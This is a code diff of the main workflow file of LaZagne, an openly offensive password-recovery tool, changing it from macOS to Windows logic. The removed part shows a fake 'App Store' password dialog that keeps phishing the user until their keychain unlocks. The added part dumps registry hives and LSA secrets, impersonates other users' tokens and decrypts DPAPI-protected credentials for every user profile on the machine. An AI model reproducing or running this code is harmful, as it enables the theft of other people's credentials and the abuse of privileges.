@@ -1,19 +1,27 @@
 # -*- coding: utf-8 -*-
 # !/usr/bin/python
-import subprocess
+import ctypes
+import logging
+import sys
 import traceback
-import getpass
 
-from lazagne.config.constant import constant
+from lazagne.config.change_privileges import list_sids, rev2self, impersonate_sid_long_handle
+from lazagne.config.users import get_user_list_on_filesystem, set_env_variables, get_username_winapi
+from lazagne.config.dpapi_structure import SystemDpapi, are_masterkeys_retrieved
+from lazagne.config.execute_cmd import save_hives, delete_hives
 from lazagne.config.write_output import print_debug, StandardOutput
+from lazagne.config.constant import constant
 from lazagne.config.manage_modules import get_categories, get_modules
-from lazagne.softwares.browsers.chrome import Chrome
+
+# Useful for the Pupy project
+# workaround to this error: RuntimeError: maximum recursion depth exceeded while calling a Python object
+sys.setrecursionlimit(10000)
 
 
 def create_module_dic():
     if constant.modules_dic:
         return constant.modules_dic
-
+    
     modules = {}
 
     # Define a dictionary for all modules
@@ -28,32 +36,29 @@ def create_module_dic():
     return modules
 
 
-def get_safe_storage_key(key):
-    try:
-        for passwords in constant.keychains_pwds:
-            if key in passwords['Service']:
-                return passwords['Password']
-    except Exception:
-        pass
-
-    return False
-
-
-def run_cmd(cmd):
-    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    result, _ = p.communicate()
-    if result:
-        return result
-    else:
-        return ''
-
-
-def run_module(module, subcategories):
+def run_module(title, module):
     """
     Run only one module
     """
-    modules_to_launch = []
+    try:
+        constant.st.title_info(title.capitalize())  # print title
+        pwd_found = module.run()  # run the module
+        constant.st.print_output(title.capitalize(), pwd_found)  # print the results
 
+        # Return value - not used but needed
+        yield True, title.capitalize(), pwd_found
+    except Exception:
+        error_message = traceback.format_exc()
+        print_debug('DEBUG', error_message)
+        yield False, title.capitalize(), error_message
+
+
+def run_modules(module, subcategories={}, system_module=False):
+    """
+    Run modules inside a category (could be one or multiple modules)
+    """
+    modules_to_launch = []
+    
     # Launch only a specific module
     for i in subcategories:
         if subcategories[i] and i in module:
@@ -64,84 +69,193 @@ def run_module(module, subcategories):
         modules_to_launch = module
 
     for i in modules_to_launch:
-        try:
-            constant.st.title_info(i.capitalize())  # print title
-            pwd_found = module[i].run()  # run the module
-            constant.st.print_output(i.capitalize(), pwd_found)  # print the results
+        # Only current user could access to HKCU registry or use some API that only can be run from the user environment
+        if not constant.is_current_user:
+            if module[i].registry_used or module[i].only_from_current_user:
+                continue
 
-            # Return value - not used but needed
-            yield True, i.capitalize(), pwd_found
-        except Exception:
-            error_message = traceback.format_exc()
-            print_debug('DEBUG', error_message)
-            yield False, i.capitalize(), error_message
+        if system_module ^ module[i].system_module:
+            continue
+
+        if module[i].winapi_used:
+            constant.module_to_exec_at_end['winapi'].append({
+                'title': i,
+                'module': module[i],
+            })
+            continue
+
+        if module[i].dpapi_used:
+            constant.module_to_exec_at_end['dpapi'].append({
+                'title': i,
+                'module': module[i],
+            })
+            continue
+
+        # Run module
+        for m in run_module(title=i, module=module[i]):
+            yield m
 
 
-def run_modules(category_selected, subcategories):
-    """
-    Run modules
-    """
+def run_category(category_selected, subcategories={}, system_module=False):
+    constant.module_to_exec_at_end = {
+        "winapi": [],
+        "dpapi": [],
+    }
     modules = create_module_dic()
     categories = [category_selected] if category_selected != 'all' else get_categories()
     for category in categories:
-        for r in run_module(modules[category], subcategories):
+        for r in run_modules(modules[category], subcategories, system_module):
             yield r
 
+    if not system_module:
+        if constant.is_current_user:
+            # Modules using Windows API (CryptUnprotectData) can be called from the current session
+            for module in constant.module_to_exec_at_end.get('winapi', []):
+                for m in run_module(title=module['title'], module=module['module']):
+                    yield m
 
-def run_lazagne(category_selected='all', subcategories={}, password=None, interactive=False):
+            if constant.module_to_exec_at_end.get('dpapi', []):
+                if are_masterkeys_retrieved():
+                    for module in constant.module_to_exec_at_end.get('dpapi', []):
+                        for m in run_module(title=module['title'], module=module['module']):
+                            yield m
+        else:
+            if constant.module_to_exec_at_end.get('dpapi', []) or constant.module_to_exec_at_end.get('winapi', []):
+                if are_masterkeys_retrieved():
+                    # Execute winapi/dpapi modules - winapi decrypt blob using dpapi without calling CryptUnprotectData
+                    for i in ['winapi', 'dpapi']:
+                        for module in constant.module_to_exec_at_end.get(i, []):
+                            for m in run_module(title=module['title'], module=module['module']):
+                                yield m
+
+
+def run_lazagne(category_selected='all', subcategories={}, password=None):
     """
-    Main function
+    Execution Workflow:
+    - If admin:
+        - Execute system modules to retrieve LSA Secrets and user passwords if possible
+            - These secret could be useful for further decryption (e.g Wifi)
+        - If a process of another user is launched try to impersone it (impersonating his token)
+            - TO DO: if hashdump retrieved other local account, launch a new process using psexec techniques 
+    - From our user:
+        - Retrieve all passwords using their own password storage algorithm (Firefox, Pidgin, etc.)
+        - Retrieve all passwords using Windows API - CryptUnprotectData (Chrome, etc.)
+        - If the user password or the dpapi hash is found:
+            - Retrieve all passowrds from an encrypted blob (Credentials files, Vaults, etc.)
+    - From all users found on the filesystem (e.g C:\\Users) - Need admin privilege:
+        - Retrieve all passwords using their own password storage algorithm (Firefox, Pidgin, etc.)
+        - If the user password or the dpapi hash is found:
+            - Retrieve all passowrds from an encrypted blob (Chrome, Credentials files, Vaults, etc.)
+
+    To resume:
+    - Some passwords (e.g Firefox) could be retrieved from any other user
+    - CryptUnprotectData can be called only from our current session
+    - DPAPI Blob can decrypted only if we have the password or the hash of the user
     """
+
+    # Useful if this function is called from another tool
     if password:
         constant.user_password = password
 
     if not constant.st:
         constant.st = StandardOutput()
 
-    user = getpass.getuser()
-    constant.finalResults = {'User': user}
+    # --------- Execute System modules ---------
+    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+        if save_hives():
+            # System modules (hashdump, lsa secrets, etc.)
+            constant.username = 'SYSTEM'
+            constant.finalResults = {'User': constant.username}
+            constant.system_dpapi = SystemDpapi()
 
-    # Could be easily changed
-    application = 'App Store'
+            if logging.getLogger().isEnabledFor(logging.INFO):
+                constant.st.print_user(constant.username)
+            yield 'User', constant.username
 
-    i = 0
-    while True:
-        # Run all modules
-        for r in run_modules(category_selected, subcategories):
+            try:
+                for r in run_category(category_selected, subcategories, system_module=True):
+                    yield r
+            except:  # Catch all kind of exceptions
+                pass
+            finally:
+                delete_hives()
+
+            constant.stdout_result.append(constant.finalResults)
+
+    # ------ Part used for user impersonation ------
+
+    constant.is_current_user = True
+    constant.username = get_username_winapi()
+    if not constant.username.endswith('$'):
+        
+        constant.finalResults = {'User': constant.username}
+        constant.st.print_user(constant.username)
+        yield 'User', constant.username
+
+        set_env_variables(user=constant.username)
+
+        for r in run_category(category_selected, subcategories):
             yield r
+        constant.stdout_result.append(constant.finalResults)
+    
+    # Check if admin to impersonate
+    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
 
-        # Execute once if not interactive,
-        # Otherwise print the dialog box until the user keychain is unlocked (so the user password has been found)
-        if not interactive or (interactive and constant.user_keychain_find):
-            break
+        # --------- Impersonation using tokens ---------
 
-        elif interactive and not constant.user_keychain_find:
-            msg = ''
-            if i == 0:
-                msg = 'App Store requires your password to continue.'
-            else:
-                msg = 'Password incorrect! Please try again.'
+        sids = list_sids()
+        impersonate_users = {}
+        impersonated_user = [constant.username]
 
-            # Code inspired from: https://github.com/fuzzynop/FiveOnceInYourLife
-            cmd = 'osascript -e \'tell app "{application}" to activate\' -e \'tell app "{application}" ' \
-                  'to activate\' -e \'tell app "{application}" to display dialog "{msg}" & return & ' \
-                  'return  default answer "" with icon 1 with hidden answer with title "{application} Alert"\''.format(
-                    application=application, msg=msg
-            )
-            pwd = run_cmd(cmd)
-            if pwd.split(':')[1].startswith('OK'):
-                constant.user_password = pwd.split(':')[2].strip()
+        for sid in sids:
+            # Not save the current user's SIDs and not impersonate system user
+            if constant.username != sid[3] and sid[2] != 'S-1-5-18':
+                impersonate_users.setdefault(sid[3], []).append(sid[2])
 
-        i += 1
+        for user in impersonate_users:
+            if 'service' in user.lower().strip():
+                continue
 
-        # If the user enter 10 bad password, be nice with him and break the loop
-        if i > 10:
-            break
+            # Do not impersonate the same user twice
+            if user in impersonated_user:
+                continue
 
-    # If keychains has been decrypted, launch again some module
-    chrome_key = get_safe_storage_key('Chrome Safe Storage')
-    if chrome_key:
-        for r in run_module({'chrome': Chrome(safe_storage_key=chrome_key)}, subcategories):
-            yield r
+            constant.st.print_user(user)
+            yield 'User', user
 
-    constant.stdout_result.append(constant.finalResults)
+            constant.finalResults = {'User': user}
+            for sid in impersonate_users[user]:
+                try:
+                    set_env_variables(user, to_impersonate=True)
+                    if impersonate_sid_long_handle(sid, close=False):
+                        impersonated_user.append(user)
+
+                        # Launch module wanted
+                        for r in run_category(category_selected, subcategories):
+                            yield r
+
+                        rev2self()
+                        constant.stdout_result.append(constant.finalResults)
+                        break
+                except Exception:
+                    print_debug('DEBUG', traceback.format_exc())
+
+        # --------- Impersonation browsing file system ---------
+
+        constant.is_current_user = False
+        # Ready to check for all users remaining
+        all_users = get_user_list_on_filesystem(impersonated_user=[constant.username])
+        for user in all_users:
+            # Fix value by default for user environment (APPDATA and USERPROFILE)
+            set_env_variables(user, to_impersonate=True)
+            constant.st.print_user(user)
+
+            constant.username = user
+            constant.finalResults = {'User': user}
+            yield 'User', user
+
+            # Retrieve passwords that need high privileges
+            for r in run_category(category_selected, subcategories):
+                yield r
+
+            constant.stdout_result.append(constant.finalResults)
